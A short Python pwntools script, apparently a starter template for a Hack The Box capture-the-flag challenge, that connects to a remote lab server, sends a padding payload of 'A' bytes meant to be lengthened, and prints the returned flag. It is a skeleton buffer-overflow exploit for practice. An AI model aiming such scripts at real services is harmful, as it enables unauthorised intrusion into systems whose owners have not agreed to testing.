 from pwn import *


IP   ='     167.172.50.208 ' 
PORT = 31343      

r    = remote(IP, PORT)

# Craft payload
payload = b'A' * 4 # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
